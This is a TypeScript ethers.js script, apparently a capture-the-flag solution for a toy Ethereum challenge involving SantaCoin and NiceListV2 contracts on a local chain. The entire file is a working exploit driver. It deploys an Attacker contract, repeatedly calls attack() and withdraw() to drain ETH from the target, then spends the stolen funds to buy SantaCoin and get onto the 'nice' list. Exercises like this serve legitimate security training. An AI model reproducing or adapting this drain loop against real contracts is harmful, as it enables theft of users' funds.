import {Wallet, ethers} from "ethers";

import Attacker from "../artifacts/contracts/Attacker.sol/Attacker.json";
import NiceListV2 from "../artifacts/contracts/NiceListV2.sol/NiceListV2.json";
import SantaCoin from "../artifacts/contracts/SantaCoin.sol/SantaCoin.json";

async function main() {
  if (process.argv.length < 4) {
    console.error("attack.ts SANTACOIN-ADDRESS NiceListV2-ADDRESS");
    return;
  }
  const provider = new ethers.providers.JsonRpcProvider(
    "http://127.0.0.1:8545"
  );

  if (!process.env.ETH_KEY) {
    console.error("No private key provided");
    return;
  }

  let attacker = new Wallet(process.env.ETH_KEY);
  attacker = attacker.connect(provider);

  const santaCoin = new ethers.Contract(process.argv[2], SantaCoin.abi);
  const niceListV2 = new ethers.Contract(process.argv[3], NiceListV2.abi);
  let isNice = await niceListV2.connect(attacker).isNice(attacker.address);
  console.log(`isNice: ${isNice}`);

  const attackerFactory = new ethers.ContractFactory(
    Attacker.abi,
    Attacker.bytecode
  );
  const attackerContract = await attackerFactory
    .connect(attacker)
    .deploy(process.argv[3], process.argv[2]);
  await attackerContract.fundContract({value: ethers.utils.parseEther("1")});

  console.log("Attacking...");
  while (true) {
    const balance = await provider.getBalance(attackerContract.address);
    console.log(`Balance: ${ethers.utils.formatEther(balance)} ETH`);
    if (parseInt(ethers.utils.formatEther(balance)) > 90) {
      break;
    }

    await attackerContract.attack(balance);
    await attackerContract.withdraw(ethers.utils.parseEther("0.5"));
  }

  await attackerContract.attack(ethers.utils.parseEther("10"));
  const balance = await provider.getBalance(attackerContract.address);
  await attackerContract.withdraw(balance);
  console.log(
    ethers.utils.formatEther(await provider.getBalance(attacker.address))
  );

  await santaCoin
    .connect(attacker)
    .buyCoins({value: ethers.utils.parseEther("100")});
  await santaCoin
    .connect(attacker)
    .increaseAllowance(niceListV2.address, ethers.utils.parseEther("100"));
  await niceListV2.connect(attacker).buyIn(ethers.utils.parseEther("100"));
  isNice = await niceListV2.connect(attacker).isNice(attacker.address);
  console.log(`isNice: ${isNice}`);
}

main();
